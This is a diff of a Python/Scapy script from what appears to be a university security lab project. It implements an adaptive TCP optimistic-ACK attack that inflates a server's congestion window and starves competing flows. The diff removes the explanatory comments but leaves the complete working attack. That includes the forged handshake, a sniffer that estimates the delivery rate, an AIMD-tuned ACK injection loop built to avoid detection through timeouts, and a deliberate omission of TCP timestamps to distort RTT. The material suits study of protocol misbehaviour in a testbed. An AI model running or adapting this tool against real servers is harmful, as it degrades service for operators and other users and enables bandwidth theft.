@@ -1,52 +1,4 @@
 #!/usr/bin/env python3
-"""
-optimistic_client.py — Adaptive TCP Optimistic-ACK Generator (h2: 10.0.0.3)
-CSE 406: Computer Security Lab Project
-
-Performs a legitimate TCP 3-way handshake and HTTP GET, then injects ACK
-segments *optimistically* — acknowledging data the server has already sent
-but that the attacker may not have received yet — to hide congestion loss and
-compress the server's RTT estimate, inflating its congestion window far beyond
-the path's capacity and starving competing honest flows (Savage et al. 1999,
-"TCP Congestion Control with a Misbehaving Receiver"; Sherwood et al. 2005).
-
-Why the naive versions fail (and what this fixes)
--------------------------------------------------
-* Too aggressive (fixed-rate advance): the ACK pointer marches at a constant
-  rate and quickly passes the server's real ``snd_nxt``. Verified against the
-  Linux kernel (``tcp_ack()``: ``if (after(ack, tp->snd_nxt))``): such an ACK
-  is DROPPED (``SKB_DROP_REASON_TCP_ACK_UNSENT_DATA``) — it does NOT advance
-  ``snd_una``. With no valid ACK arriving, the oldest genuinely-unacked segment
-  times out → RTO → ``cwnd`` collapses to 1. The attack destroys itself.
-* Too timid (ACK only received data): under an inflated window the bottleneck
-  drops the tail of every burst; those bytes never arrive, so the ACK stalls,
-  the server sees the loss and backs off. No theft — just a fair-share flow.
-
-The sustainable middle ground (this implementation)
----------------------------------------------------
-The ACK is *delivery-clocked*: it rides on ``rcv_high`` (the highest byte the
-sniffer has actually seen leave the server) plus a **bounded, adaptive
-margin** that stays strictly inside the in-flight window, so it is (almost
-always) a valid ACK ``received < ack <= snd_nxt``:
-
-    ack = rcv_high + margin,   margin = f * rate_est * RTT0
-
-* ``rate_est`` is an EWMA of the server's *measured* delivery rate, so the
-  long-run ACK-advance rate equals the true send rate and can never run away.
-* ``f`` in [F_MIN, F_MAX] is AIMD-controlled: it probes up slowly while data
-  flows and is halved the instant delivery stalls (the only observable symptom
-  of an accidental overshoot). On stall, margin drops to 0 so the next ACK is
-  ``rcv_high`` — valid with certainty — which re-opens the window well within
-  the RTO. This is the liveness invariant that keeps the connection alive.
-* Because ``rcv_high`` is a *cumulative* high-water mark, ACKing it already
-  covers bytes dropped in the bottleneck queue — concealing the loss so the
-  server never retransmits and never reduces ``cwnd``. That concealment is the
-  attack's primary weapon; the margin adds RTT compression on top.
-
-Kernel RST from the attacker host is dropped by an iptables rule installed in
-topology.py, so this user-space Scapy connection is not torn down. All traffic
-stays within the isolated Mininet testbed.
-"""
 
 import argparse
 import logging
@@ -56,10 +8,6 @@ import sys
 import threading
 import time
 
-# Silence Scapy's optional-layer loader BEFORE import: on some distros the
-# bundled Scapy fails to load scapy.layers.tls (cryptography API drift), which
-# is harmless noise for us. Importing the specific core layers below also
-# avoids pulling in the TLS/Kerberos/SPNEGO chain that triggers it.
 logging.getLogger("scapy").setLevel(logging.CRITICAL)
 
 try:
@@ -68,7 +16,7 @@ try:
     from scapy.sendrecv import sr1, send, sniff
     from scapy.config import conf
     from scapy.volatile import RandShort
-except Exception:  # pragma: no cover - fallback for unusual layouts
+except Exception:
     from scapy.all import IP, TCP, Raw, send, sr1, sniff, conf, RandShort
 
 logging.basicConfig(
@@ -83,18 +31,7 @@ conf.verb = 0
 MSS = 1460
 MASK = 0xFFFFFFFF
 
-
 class OptimisticACKClient:
-    """
-    Adaptive, delivery-clocked optimistic-ACK attacker.
-
-    A background sniffer tracks ``rcv_high`` (highest byte delivered past the
-    bottleneck) and ``rate_est`` (EWMA of the server's delivery rate). The
-    injection loop ACKs ``rcv_high + margin`` where ``margin`` is a bounded
-    fraction of one bandwidth-delay product, adapted by AIMD and collapsed to
-    zero the instant delivery stalls — keeping every ACK valid and the
-    connection alive while the server's cwnd inflates.
-    """
 
     def __init__(self, server_ip, server_port, src_port, target_bw_mbps,
                  duration, multiplier):
@@ -109,36 +46,31 @@ class OptimisticACKClient:
         self.s0 = None
         self.client_seq = None
 
-        # ---- shared state (written by the sniffer thread) ----
         self.lock = threading.Lock()
-        self.rcv_high = 0            # highest (seq + payload_len) delivered
-        self.rate_est = 0.0          # EWMA of server delivery rate (bytes/s)
-        self.rate_peak = 0.0         # high-water of rate_est (bytes/s)
-        self.t_last_data = 0.0       # monotonic time of last data packet
-        self._last_seq_time = 0.0    # for inter-arrival EWMA
+        self.rcv_high = 0
+        self.rate_est = 0.0
+        self.rate_peak = 0.0
+        self.t_last_data = 0.0
+        self._last_seq_time = 0.0
         self.data_pkts_seen = 0
         self.total_server_bytes = 0
 
-        self.last_acked = 0          # highest ack_seq we have sent (for logs)
-        self.measured_rtt = None     # from handshake
+        self.last_acked = 0
+        self.measured_rtt = None
 
         self.running = False
         self.sniffer_thread = None
-        self.l3 = None               # persistent send socket
+        self.l3 = None
 
         self.stats = {
             "acks_sent": 0,
             "bytes_claimed": 0,
-            "optimistic_acks": 0,    # ACKs sent ahead of confirmed-received data
-            "backoffs": 0,           # stall-triggered margin collapses
+            "optimistic_acks": 0,
+            "backoffs": 0,
         }
 
-    # ------------------------------------------------------------------
-    # 32-bit sequence arithmetic (wraparound-safe)
-    # ------------------------------------------------------------------
     @staticmethod
     def seq_after(a, b):
-        """True if a > b in 32-bit sequence space."""
         d = (a - b) & MASK
         return d != 0 and d < 0x80000000
 
@@ -146,18 +78,10 @@ class OptimisticACKClient:
     def seq_max(a, b):
         return a if OptimisticACKClient.seq_after(a, b) else b
 
-    # ------------------------------------------------------------------
-    # TCP Handshake — also measures the base RTT (before any queue builds)
-    # ------------------------------------------------------------------
     def handshake(self):
         log.info("Starting 3-way handshake to %s:%d", self.server_ip,
                  self.server_port)
 
-        # NOTE: deliberately no ("Timestamp", ...) option. Without TCP
-        # timestamps the server measures RTT from each segment's send time, so
-        # our early (optimistic) ACKs directly shrink its srtt. Negotiating
-        # timestamps would let the server derive RTT from the echoed TSval and
-        # blunt the RTT-compression half of the attack.
         syn = (
             IP(dst=self.server_ip)
             / TCP(sport=self.src_port, dport=self.server_port,
@@ -193,9 +117,6 @@ class OptimisticACKClient:
         log.info("Handshake complete — server ISN=%d, base RTT=%.1f ms",
                  self.s0, self.measured_rtt * 1000)
 
-    # ------------------------------------------------------------------
-    # HTTP GET
-    # ------------------------------------------------------------------
     def send_get(self, path="/video.mp4"):
         http_req = (
             f"GET {path} HTTP/1.1\r\n"
@@ -215,9 +136,6 @@ class OptimisticACKClient:
         self.client_seq = (self.client_seq + len(payload)) & MASK
         log.info("Sent HTTP GET %s", path)
 
-    # ------------------------------------------------------------------
-    # Background sniffer — tracks rcv_high and the delivery rate (EWMA)
-    # ------------------------------------------------------------------
     def _sniffer_callback(self, pkt):
         if not pkt.haslayer(TCP):
             return
@@ -239,12 +157,8 @@ class OptimisticACKClient:
             dt = now - self._last_seq_time
             if dt > 0:
                 inst = payload_len / dt
-                # Time-aware EWMA: a short gap contributes little, so a burst of
-                # back-to-back packets over a tiny dt cannot spike the estimate.
                 a = 1.0 - math.exp(-dt / self.RATE_TAU)
                 self.rate_est = (1.0 - a) * self.rate_est + a * inst
-                # Clamp to a sane physical ceiling (guards the margin cap
-                # against a pathological instantaneous spike).
                 if self.rate_est > self.RATE_CEIL:
                     self.rate_est = self.RATE_CEIL
                 if self.rate_est > self.rate_peak:
@@ -264,41 +178,26 @@ class OptimisticACKClient:
         self.sniffer_thread = threading.Thread(target=_run, daemon=True)
         self.sniffer_thread.start()
 
-    # ------------------------------------------------------------------
-    # Derive controller constants from the measured link + CLI knobs
-    # ------------------------------------------------------------------
     def compute_parameters(self):
         rtt0 = self.measured_rtt if self.measured_rtt else 0.1
-        rtt0 = min(max(rtt0, 0.02), 0.5)          # sane bounds
+        rtt0 = min(max(rtt0, 0.02), 0.5)
         self.RTT0 = rtt0
 
-        # rate_est smoothing (~half an RTT): reacts within half a round trip to
-        # a genuine delivery drop yet ignores per-packet jitter.
         self.RATE_TAU = max(0.02, rtt0 / 2.0)
-        # Physical ceiling for the rate estimate: generous headroom over the
-        # nominal path so a real rate is never clipped, but a spike is bounded.
         self.RATE_CEIL = (self.target_bw_mbps * 1e6 / 8.0) * 2.0
 
-        # AIMD aggressiveness band. 'multiplier' scales the ceiling: 2.0 -> 0.70
-        # (perceived RTT ~ 0.30*real). Clamped so we never pre-ack a full pipe.
         self.F_MAX = min(0.85, max(0.35, 0.35 * self.multiplier))
         self.F_INIT = 0.6 * self.F_MAX
         self.F_MIN = 0.35 * self.F_MAX
         self.F_STEP = 0.05
         self.F_BACKOFF = 0.5
 
-        # Hard ceiling on the lead: a fraction of ONE *measured* BDP, so the ack
-        # can never reach the real snd_nxt even if f and rate_est are both high.
         self.MARGIN_CAP_FRAC = 0.75
 
-        # Loop pacing and liveness thresholds.
-        self.ACK_INTERVAL = 0.002       # 500 Hz poll (naturally caps send rate)
-        self.STALL_GAP = 0.030          # s of silence => overshoot/stall symptom
-        self.KEEPALIVE = 0.040          # max spacing for an unchanged ack
+        self.ACK_INTERVAL = 0.002
+        self.STALL_GAP = 0.030
+        self.KEEPALIVE = 0.040
 
-        # Advertised receive window: large enough to keep the bottleneck
-        # saturated (>> BDP+queue) yet bounded, so worst-case in-flight — and
-        # the collateral queue drops — stay in check. WScale 7 was negotiated.
         self.rwnd_bytes = 400 * MSS
         self.win_field = min(0xFFFF, self.rwnd_bytes >> 7)
 
@@ -314,9 +213,6 @@ class OptimisticACKClient:
         log.info("  Advertised rwnd:    %d B (field %d << 7)",
                  self.rwnd_bytes, self.win_field)
 
-    # ------------------------------------------------------------------
-    # Adaptive optimistic-ACK injection loop
-    # ------------------------------------------------------------------
     def inject_acks(self):
         self.running = True
         now0 = time.monotonic()
@@ -325,12 +221,9 @@ class OptimisticACKClient:
             self._last_seq_time = now0
 
         self.start_sniffer()
-        time.sleep(0.5)                 # let a little data arrive first
+        time.sleep(0.5)
         self.compute_parameters()
 
-        # Persistent L3 socket + reused ACK template: assigning .ack invalidates
-        # Scapy's build cache so checksums recompute, but we skip re-parsing the
-        # whole packet each tick — important at hundreds of ACKs/second.
         self.l3 = conf.L3socket()
         ack_tmpl = (
             IP(dst=self.server_ip)
@@ -360,10 +253,6 @@ class OptimisticACKClient:
                 rp = self.rate_peak
                 tld = self.t_last_data
 
-            # (1) Overshoot / stall detection. The only observable symptom of an
-            #     ack passing snd_nxt is that the server stops advancing snd_una
-            #     and therefore stops sending: no new data for STALL_GAP, or the
-            #     delivery rate collapsing well below its own peak.
             stalled = (now - tld > self.STALL_GAP) or (rp > 0 and r < 0.5 * rp)
 
             if stalled:
@@ -371,28 +260,22 @@ class OptimisticACKClient:
                 margin = 0.0
                 self.stats["backoffs"] += 1
             else:
-                if now - t_grow >= self.RTT0:      # AIMD additive probe, 1x/RTT
+                if now - t_grow >= self.RTT0:
                     f = min(self.F_MAX, f + self.F_STEP)
                     t_grow = now
                 margin = f * r * self.RTT0
 
-            # (2) Hard clamp: never lead by more than a fraction of one measured
-            #     BDP, regardless of f / rate spikes.
             cap = self.MARGIN_CAP_FRAC * rp * self.RTT0
             if cap > 0:
                 margin = min(margin, cap)
             ack = (rcv_high + int(margin)) & MASK
 
-            # (3) Emit. Send whenever the ack VALUE changes (monotone rcv_high
-            #     keeps successive values distinct, so backoff acks never form a
-            #     3-identical dup-ack burst) or once per KEEPALIVE to keep the
-            #     window open during a lull.
             if ack != last_sent_ack or (now - last_emit) >= self.KEEPALIVE:
                 ack_tmpl[TCP].ack = ack
                 try:
                     self.l3.send(ack_tmpl)
                 except OSError:
-                    send(ack_tmpl)     # fall back if the socket hiccups
+                    send(ack_tmpl)
 
                 adv = (ack - last_sent_ack) & MASK
                 if adv and adv < 0x80000000:
@@ -405,7 +288,6 @@ class OptimisticACKClient:
                 with self.lock:
                     self.last_acked = self.seq_max(self.last_acked, ack)
 
-            # (4) Periodic progress line
             if now - last_log >= 5.0:
                 with self.lock:
                     pkts = self.data_pkts_seen
@@ -425,7 +307,6 @@ class OptimisticACKClient:
         self.running = False
         self._print_summary(time.monotonic() - start_time)
 
-    # ------------------------------------------------------------------
     def _print_summary(self, total_time):
         with self.lock:
             total_server = self.total_server_bytes
@@ -448,9 +329,6 @@ class OptimisticACKClient:
         log.info("Effective ACK rate: %.0f ACKs/s",
                  self.stats["acks_sent"] / max(total_time, 0.001))
 
-    # ------------------------------------------------------------------
-    # Teardown
-    # ------------------------------------------------------------------
     def teardown(self):
         fin = (
             IP(dst=self.server_ip)
@@ -464,7 +342,6 @@ class OptimisticACKClient:
 
     def stop(self):
         self.running = False
-
 
 def main():
     parser = argparse.ArgumentParser(
@@ -485,7 +362,6 @@ def main():
              "(default: 2.0)")
     parser.add_argument("--duration", type=int, default=60,
         help="Attack duration in seconds (default: 60)")
-    # Legacy args (ignored, kept for run_experiment.sh backward compatibility)
     parser.add_argument("--delta", type=int, default=0, help=argparse.SUPPRESS)
     parser.add_argument("--rate", type=float, default=0, help=argparse.SUPPRESS)
     args = parser.parse_args()
@@ -511,7 +387,6 @@ def main():
     time.sleep(1.0)
     client.inject_acks()
     client.teardown()
-
 
 if __name__ == "__main__":
     main()
